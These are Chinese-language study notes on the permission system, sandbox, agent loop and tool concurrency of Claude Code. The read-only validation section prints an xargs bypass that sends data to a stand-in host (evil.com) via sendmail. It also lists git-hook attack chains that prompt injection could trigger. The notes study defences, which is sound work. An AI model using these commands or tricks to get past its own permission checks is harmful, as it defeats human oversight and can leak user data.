---
---
# 苏格拉底专题 01：安全体系与 Agent 循环

> 学习方式：苏格拉底对话法（问答驱动、逐步发现）
> 日期：2026-04-01
> 覆盖主题：权限系统五层防御、Bash AST 安全分析、OS 沙箱、Agent 循环状态机、工具并发控制

---

## 第一部分：权限系统——五层防御模型

### 核心设计问题：谁来决定一个工具调用是否安全？

在 Claude Code 中，模型既是工具的调用者，也是任务的执行者。让模型自己判断操作安不安全不可靠（幻觉问题），因此安全判断必须由**系统规则 + 用户确认**共同完成，而非依赖模型。

### 第一层：工具静态分类

每个工具天生有"只读"或"可写"的属性。`FileReadTool` 读文件无破坏性，可直接放行；`BashTool` 能执行任意命令，需要进一步分析。

### 第二层：Bash AST 分析（fail-closed 白名单）

**核心文件**：`src/utils/bash/ast.ts`

不是字符串匹配，而是把 bash 命令解析成 AST（抽象语法树），在语法树层面判断危险性。

关键设计——**fail-closed（失败即关闭）**：

```
白名单里的节点 → 逐个分析，放行已知安全的
DANGEROUS_TYPES 里的 → 直接标记危险
两者都不在的未知节点 → 也当作危险处理（too-complex）
```

`DANGEROUS_TYPES` 包含 `command_substitution`、`process_substitution`、`subshell`、`for_statement`、`while_statement`、`if_statement`、`function_definition` 等 18 种 AST 节点类型。

**为什么比黑名单好？** 黑名单漏掉一个危险命令就完了；白名单漏掉的东西默认被拦截。

### 第三层：权限规则匹配（三级粒度）

**核心文件**：`src/utils/permissions/shellRuleMatching.ts`

```typescript
type ShellPermissionRule =
  | { type: 'exact',    command: string }   // 精确匹配："npm test"
  | { type: 'prefix',   prefix: string }    // 前缀匹配："npm:*"
  | { type: 'wildcard', pattern: string }   // 通配符："git commit -m *"
```

在「最小授权」和「实用性」之间的平衡——前缀匹配 `npm:*` 意味着信任所有 npm 命令，比逐条授权方便，又比开放所有 bash 安全。

### 第四层：用户交互确认

以上规则都无法判断时，才弹出交互确认让用户决定。

### 第五层：OS 沙箱（opt-in）

**核心文件**：`src/utils/sandbox/sandbox-adapter.ts`、`src/entrypoints/sandboxTypes.ts`

| 平台 | 机制 |
|---|---|
| macOS | seatbelt（sandbox-exec） |
| Linux | seccomp + bubblewrap |

通过 `@anthropic-ai/sandbox-runtime` 统一封装，支持三类限制：

| 限制类型 | 说明 |
|---|---|
| `FsReadRestrictionConfig` | 限制可读路径 |
| `FsWriteRestrictionConfig` | 限制可写路径 |
| `NetworkRestrictionConfig` | 限制网络访问（按域名模式） |

**关键发现：沙箱默认关闭**（`settings?.sandbox?.enabled ?? false`）。原因是开箱即用的可用性——沙箱会导致 `npm install` 等常见操作直接失败。安全交给前四层，沙箱是高安全需求的 opt-in 能力。

配置示例：

```jsonc
{
  "sandbox": {
    "enabled": true,
    "autoAllowBashIfSandboxed": true,  // 沙箱内 bash 自动放行
    "filesystem": {
      "allowWrite": ["/tmp/my-builds"],
      "denyRead": ["~/.ssh"]
    },
    "network": {
      "allowedDomains": ["registry.npmjs.org"]
    }
  }
}
```

巧妙设计：`autoAllowBashIfSandboxed` 开启后，沙箱接管安全职责，权限确认就可以放松——安全和体验的平衡。

---

## 第二部分：只读判断深潜

### isCommandReadOnly：flag 级白名单

**核心文件**：`src/tools/BashTool/readOnlyValidation.ts`

只读判断不是命令级，而是**flag 级**：

```typescript
const COMMAND_ALLOWLIST = {
  xargs: {
    safeFlags: {
      '-I': '{}',       // 安全，接受一个替换符
      '-n': 'number',   // 安全，接受数字
      '-0': 'none',     // 安全，无参数
      // -i 和 -e 被移除！GNU 可选参数语义导致安全漏洞
    }
  },
  sed: { safeFlags: { '--quiet': 'none', '-n': 'none', ... } },
  sort: { ... },
  ...GIT_READ_ONLY_COMMANDS,
}
```

每个 flag 标注参数类型（`none`、`number`、`string`、`char`），验证参数合法性。

### xargs `-i` 漏洞案例

```bash
echo /usr/sbin/sendm | xargs -it tail a@evil.com
# 验证器以为：-i 和 t 是两个 flag，tail 在安全目标里 → 放行
# GNU xargs 实际：-i 的 replace-str=t，tail 成为目标命令
# → /usr/sbin/sendmail → 网络数据泄露
```

### git hooks 攻击向量

`git status` 是只读命令，但 git 执行前会跑 hooks——hooks 可执行任意代码。

代码防了三种攻击：

1. **cd + git**：`cd /malicious/dir && git status` → 触发恶意目录下的 hooks
2. **裸仓库伪造**：删掉 `.git/HEAD`，在当前目录放 `hooks/pre-commit`
3. **先写后执行**：`mkdir -p hooks && echo 'malicious' > hooks/pre-commit && git status`

攻击者不需要是内鬼——通过 prompt injection，在代码、PR、issue 中嵌入"指令"，模型读到后可能照做。

### 完整只读判断链

```
命令能解析吗？
  → 有未展开的变量/通配符吗？
    → 命令名在白名单里吗？
      → 每个 flag 都在 safeFlags 里吗？
        → flag 的参数类型匹配吗？
          → 全部通过 → readOnly = true
```

任何一步失败都返回 false——fail-closed。

---

## 第三部分：Agent 循环——状态机

### 基本结构

**核心文件**：`src/query.ts`

`query()` 是一个 `AsyncGenerator`（`async function*`），用 `while(true)` 循环驱动。使用 AsyncGenerator 而非普通 async function，是因为需要**实时流式输出**——每产出一个事件就 yield，调用方逐个消费、实时渲染到终端。

### 状态定义

```typescript
type State = {
  messages: Message[]
  turnCount: number
  transition: Continue | undefined  // 上一轮为什么继续
  hasAttemptedReactiveCompact: boolean
  maxOutputTokensRecoveryCount: number
  maxOutputTokensOverride: number | undefined
  // ...
}
```

每轮结束构造新 State，赋值后回到循环顶部，根据状态决定下一轮行为。

### 11+ 种退出原因（三类）

| 类别 | reason | 说明 |
|---|---|---|
| 正常结束 | `completed` | 模型说完了（end_turn） |
| | `aborted_streaming` | 用户中断（streaming 阶段） |
| | `aborted_tools` | 用户中断（工具执行阶段） |
| | `hook_stopped` / `stop_hook_prevented` | Hook 阻止 |
| 异常退出 | `prompt_too_long` | 上下文超长 |
| | `image_error` | 图片处理出错 |
| | `model_error` | API 调用报错 |
| | `blocking_limit` | 速率限制 |
| 自救转换 | `reactive_compact_retry` | 压缩上下文后重试 |
| | `max_output_tokens_escalate` | 调高 token 上限重试 |
| | `collapse_drain_retry` | 折叠内容后重试 |
| | `token_budget_continuation` | token 预算内继续 |
| | `next_turn` | 正常下一轮 |

自救转换用 `transition` 而非 `return`——不退出循环，切换状态后继续。

### 循环无限防护

不做循环检测，用更可靠的 `maxTurns` 硬上限：

```typescript
if (maxTurns && nextTurnCount > maxTurns) {
  return { reason: 'max_turns', turnCount: nextTurnCount }
}
```

---

## 第四部分：工具并发控制

### isConcurrencySafe：工具自声明

**核心文件**：`src/services/tools/StreamingToolExecutor.ts`

不是系统层面按「读/写」分，而是每个工具自己声明并发安全性：

```typescript
private canExecuteTool(isConcurrencySafe: boolean): boolean {
  const executingTools = this.tools.filter(t => t.status === 'executing')
  return (
    executingTools.length === 0 ||
    (isConcurrencySafe && executingTools.every(t => t.isConcurrencySafe))
  )
}
```

规则：
- 并发安全的工具之间 → 可以并行
- 任何非并发安全的工具 → 独占执行

### BashTool 的动态判断

```typescript
isConcurrencySafe(input) {
  return this.isReadOnly?.(input) ?? false;
}
```

BashTool 不是静态声明安全性，而是**每次调用时**判断具体命令是否只读。`bash("ls")` → 只读 → 可并发；`bash("npm install")` → 非只读 → 独占。

**为什么不用全局「读/写」分类？** 因为粒度太粗——两个写不同文件的 `FileWriteTool` 可以安全并行，两个 `BashTool("npm install")` 同时跑却会冲突。工具的作者最清楚自己的并发风险。

---

## 关键设计原则总结

| 原则 | 体现 |
|---|---|
| **Fail-closed** | AST 白名单、只读判断链——未知即拒绝 |
| **分层防御** | 五层各有不同安全/体验平衡点 |
| **安全 vs 体验** | 沙箱 opt-in、`autoAllowBashIfSandboxed`、前缀匹配 |
| **自声明优于全局规则** | `isConcurrencySafe` 由工具自己决定 |
| **状态机驱动** | Agent 循环的 transition 实现自救与恢复 |
| **流式优先** | AsyncGenerator 实现实时输出 |

---

## 学习进度

- [x] 权限系统五层防御模型
- [x] Bash AST 安全分析与 fail-closed 策略
- [x] 权限规则三级粒度（exact / prefix / wildcard）
- [x] OS 沙箱机制与配置
- [x] 只读判断深潜（flag 级白名单、git hooks 攻击）
- [x] Agent 循环状态机
- [x] 工具并发控制（isConcurrencySafe）
- [ ] 多智能体架构
- [ ] 上下文管理与压缩
- [ ] 插件/技能系统
